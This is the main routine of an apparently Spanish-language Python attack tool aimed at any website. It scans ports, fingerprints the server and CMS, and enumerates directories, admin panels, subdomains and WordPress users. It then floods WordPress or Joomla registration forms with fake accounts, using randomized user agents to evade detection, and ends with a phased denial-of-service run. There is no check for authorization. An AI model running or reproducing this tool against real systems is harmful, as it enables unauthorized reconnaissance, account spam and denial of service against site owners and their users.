    parser.add_argument("--delay", type=float, default=0, help="Delay Teórico entre acciones de registros falsos")
    parser.add_argument("--user-agent", action="store_true", help="User-Agent aleatorio")
    args = parser.parse_args()

    print(BANNER)

    target = args.url
    if not target:
        try:
            target = input("URL objetivo (ej: https://ejemplo.com): ").strip()
        except KeyboardInterrupt:
            print("\nCancelado.")
            return

    url = normalize_url(target)
    if not url:
        print("URL inválida.")
        return

    parsed = urlparse(url)
    host = parsed.hostname
    if not host:
        print("No se pudo interpretar el host.")
        return

    print("\n[+] Resolviendo DNS...")
    ips = dns_resolve(host)
    print_kv("Host", host)
    print_kv("IPs resueltas", ", ".join(ips) if ips else "No disponible")

    if not args.no_ports:
        print("\n[+] Escaneando Puertos...")
        p80 = tcp_connect(host, 80)
        p443 = tcp_connect(host, 443)
        p20 = tcp_connect(host, 20)
        p21 = tcp_connect(host, 21)
        p22 = tcp_connect(host, 22)
        p8080 = tcp_connect(host, 8080)
        p8443 = tcp_connect(host, 8443)
        p9200 = tcp_connect(host, 9200)
        p27017 = tcp_connect(host, 27017)
        p6379 = tcp_connect(host, 6379)
        p5900 = tcp_connect(host, 5900)
        p5432 = tcp_connect(host, 5432)
        p3389 = tcp_connect(host, 3389)
        p3306 = tcp_connect(host, 3306)
        p2376 = tcp_connect(host, 2376)
        p2375 = tcp_connect(host, 2375)
        p2049 = tcp_connect(host, 2049)
        p1521 = tcp_connect(host, 1521)
        p1433 = tcp_connect(host, 1433)
        p995 = tcp_connect(host, 995)
        p993 = tcp_connect(host, 993)
        p873 = tcp_connect(host, 873)
        p636 = tcp_connect(host, 636)
        p587 = tcp_connect(host, 587)
        p500 = tcp_connect(host, 500)
        p465 = tcp_connect(host, 465)
        p445 = tcp_connect(host, 445)
        p389 = tcp_connect(host, 389)
        p162 = tcp_connect(host, 162)
        open_ports = []
        if p80: open_ports.append("80")
        if p443: open_ports.append("443")
        if p21: open_ports.append("21")
        if p22: open_ports.append("22")
        if p20: open_ports.append("20")
        if p8080: open_ports.append("8080")
        if p8443: open_ports.append("8443")
        if p9200: open_ports.append("9200")
        if p27017: open_ports.append("27017")
        if p6379: open_ports.append("6379")
        if p5900: open_ports.append("5900")
        if p5432: open_ports.append("5432")
        if p3389: open_ports.append("3389")
        if p3306: open_ports.append("3306")
        if p2376: open_ports.append("2376")
        if p2375: open_ports.append("2375")
        if p2049: open_ports.append("2049")
        if p1521: open_ports.append("1521")
        if p1433: open_ports.append("1433")
        if p995: open_ports.append("995")
        if p993: open_ports.append("993")
        if p873: open_ports.append("873")
        if p636: open_ports.append("636")
        if p587: open_ports.append("587")
        if p500: open_ports.append("500")
        if p465: open_ports.append("465")
        if p445: open_ports.append("445")
        if p389: open_ports.append("389")
        if p162: open_ports.append("162")
        print_kv("Puertos accesibles", ", ".join(open_ports) if open_ports else "Ninguno/Filtrado")

    print("\n[+] Consultando sitio (GET)...")
    try:
        fr = fetch(url, timeout=args.timeout)
    except requests.RequestException as e:
        print(f"Error HTTP: {e}")
        return

    origin = base_origin(fr.final_url)
    print_kv("URL final", fr.final_url)
    print_kv("HTTP status", fr.status)

    server = detect_server(fr.headers)
    waf = detect_waf(fr.headers, fr.set_cookie_raw)
    cms = detect_cms(fr.body, fr.headers, fr.set_cookie_raw)
    cms_mode = None
    if "WordPress" in cms:
            cms_mode = "wordpress"
    elif "Joomla"  in cms:
            cms_mode = "joomla"
    cms_ver = detect_cms_version(fr.body)

    present, missing = security_headers(fr.headers)
    csp_info = analyze_csp(fr.headers)
    cors_info = analyze_cors(fr.headers)
    cookie_info = parse_set_cookie_flags(fr.set_cookie_raw)

    opt_status, opt_headers = options(origin + "/", timeout=8)
    allow_info = summarize_allow_methods(opt_headers or {})

    print("\n===== IDENTIFICACIÓN =====")
    print_kv("Servidor", server)
    print_kv("WAF/CDN", waf)
    print_kv("CMS/Framework backend", cms)
    print_kv("Versión", cms_ver)

    print("\n===== POSTURA HTTP =====")
    print_kv("Security headers OK", str(len(present)))
    print_kv("Security headers faltan", str(len(missing)))
    if missing:
        print("  - " + "\n  - ".join(missing[:8]) + ("" if len(missing) <= 8 else "\n  - ..."))

    print("\n===== CSP / CORS / COOKIES =====")
    print_kv("CSP", "Presente" if csp_info["present"] else "No")
    if csp_info["warnings"]:
        for w in csp_info["warnings"][:6]:
            print(f"  - CSP: {w}")

    print_kv("CORS A-C-Allow-Origin", cors_info["aco"] if cors_info["aco"] else "No expuesto")
    if cors_info["warnings"]:
        for w in cors_info["warnings"]:
            print(f"  - {w}")

    print_kv("Set-Cookie", "Presente" if cookie_info["present"] else "No")
    if cookie_info["warnings"]:
        for w in cookie_info["warnings"][:4]:
            print(f"  - Cookies: {w}")

    print("\n===== MÉTODOS HTTP (OPTIONS) =====")
    if opt_status is None:
        print_kv("OPTIONS", "No disponible / bloqueado")
    else:
        print_kv("OPTIONS status", f"HTTP {opt_status}")
        if allow_info["present"]:
            print_kv("Allow/AC-Allow-Methods", allow_info["allow"])
            for w in allow_info["warnings"]:
                print(f"  - {w}")
        else:
            print_kv("Allow/Methods", "No expuesto")

    print("\n===== TLS (ligero) =====")
    if urlparse(fr.final_url).scheme.lower() == "https":
        tls = tls_probe(host, 443)
        if tls.get("ok"):
            print_kv("TLS versión", tls.get("version") or "N/D")
            print_kv("Cipher", f"{tls.get('cipher')} ({tls.get('bits')} bits)" if tls.get("cipher") else "N/D")
            print_kv("Cert sujeto", tls.get("subject") or "N/D")
            print_kv("Cert emisor", tls.get("issuer") or "N/D")
            print_kv("Cert válido desde", tls.get("not_before") or "N/D")
            print_kv("Cert expira", tls.get("not_after") or "N/D")
            print_kv("SAN count", str(tls.get("san_count")))
        else:
            print_kv("TLS probe", f"Error: {tls.get('error')}")
    else:
        print_kv("TLS", "No aplica (HTTP)")

    print("\n===== DETECTANDO LIBRERIAS  =====")
    assets = extract_assets(fr.body, fr.final_url)
    asset_infos = scan_assets(assets, max_each=max(0, int(args.assets)))
    stack = detect_stack(fr, assets)

    print_kv("JS libs", ", ".join(stack["js"]) if stack["js"] else "No concluyente")
    print_kv("CSS frameworks", ", ".join(stack["css"]) if stack["css"] else "No concluyente")
    print_kv("Analytics", ", ".join(stack["analytics"]) if stack["analytics"] else "No concluyente")
    print_kv("CDN/Fonts", ", ".join(stack["cdn"]) if stack["cdn"] else "No concluyente")
    if stack["hints"]:
        print_kv("Hints", " | ".join(stack["hints"][:2]))

    print("\n===== BD DETECTADA =====")
    db_guess = infer_databases(cms, stack)
    print_kv("BD", ", ".join(db_guess))

    print("\n===== ENUMERANDO DIRECTORIOS =====")
    std = check_endpoints(origin, STANDARD_ENDPOINTS, timeout=8)
    for name, path, res in std:
        print(f"  - {name:<24} {res:<14} [{path}]")

    print("\n===== PANELES ADMINISTRATIVOS =====")
    ui = check_endpoints(origin, COMMON_UI_ENDPOINTS, timeout=8)
    for name, path, res in ui:
        print(f"  - {name:<24} {res:<14} [{path}]")

    print("\n===== CABECERAS DESTACADAS =====")
    interesting = ["Server", "X-Powered-By", "Via", "Set-Cookie", "Content-Type", "Strict-Transport-Security"]
    for key in interesting:
        val = None
        for k, v in fr.headers.items():
            if k.lower() == key.lower():
                val = v
                break
        if val:
            s = str(val)
            if len(s) > 160:
                s = s[:160] + "..."
            print(f"  - {key}: {s}")
            
    print("\n===== ENUMERANDO LOS SUBDOMINIOS =====")
    base_dom = root_domain_from_host(host)   
    subs_live = subdomains_live(base_dom, timeout=args.timeout, max_names=300)
    if not subs_live:
        print_kv("Subdominios", "No encontrados / No resuelven DNS")
    else:
        print_kv("crt.sh subdominios (raw)", len(subdomain_finder(base_dom)))
        print_kv("Dominio base", base_dom)
        for sub, ips_sub in subs_live[:80]:
            print(f"  - {sub:<35} -> {', '.join(ips_sub)}")
        if len(subs_live) > 80:
            print("  - ...")
            
    print("\n===== WPCRON =====")
    verificar_wpcron(origin, timeout=args.timeout)
    print("\n===== XMLRPC =====")
    verificar_xmlrpc(origin, timeout=args.timeout)

    print("\n===== USUARIOS ENCONTRADOS =====")
    r1, r2 = buscar_usuarios_wp(origin, timeout=args.timeout)
    print("Resultado1:", r1)
    print("Resultado2:", r2)

    print("\n===== Registros de usuarios Falsos en Tabla users=====")
    fake = Faker()
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
    ]
    total = args.count
    for i in range(1, total + 1):
        name = fake.user_name()
        email = fake.email()
        password = fake.password()

        if cms_mode == "wordpress":
            register_url =f"{origin}/wp-login.php?action=register"
            payload ={
                "user_login": name,
                "user_email": email,
                "redirect_to": "",
                "wp-submit": "Register"
            }
        elif cms_mode == "joomla":
             register_url = f"{origin}/index.php/component/users/?task=registration.register"
             payload = {
                "jform[name]": name,
                "jform[username]": name,
                "jform[password1]": password,
                "jform[password2]": password,
                "jform[email1]": email,
                "jform[email2]": email
             }
        headers = {}
        if args.user_agent:
            headers["User-Agent"] = random.choice(user_agents)
        try:
            response = requests.post(register_url, data=payload, headers=headers, timeout=10)
            #print(f"[✔] Usuario {name} ({email}) enviado -> {response.status_code}")
        except Exception as e:
            print(f"[✘] Error al registrar usuario {name}: {e}")

        progress(i,total)
        if args.delay > 0 and i < total:
            time.sleep(args.delay)

    print("\n[OK] Finalizado.")


    print("\n===== Realizando Prueba de Esfuerzo (DDoS) =====")
    os.makedirs(FASE_SALIDA, exist_ok=True)
    baseline = obtener_metricas_para_ataque_DDoS(origin)
    for qtd_threads in Fases:
        ejecutar_fase_de_prueba(qtd_threads, url, timeout=args.timeout)
    estadisticas = generar_informe_ddos(url, timeout=args.timeout)
    print("\n[*] Prueba DDoS concluído!")

if __name__ == "__main__":
    main()
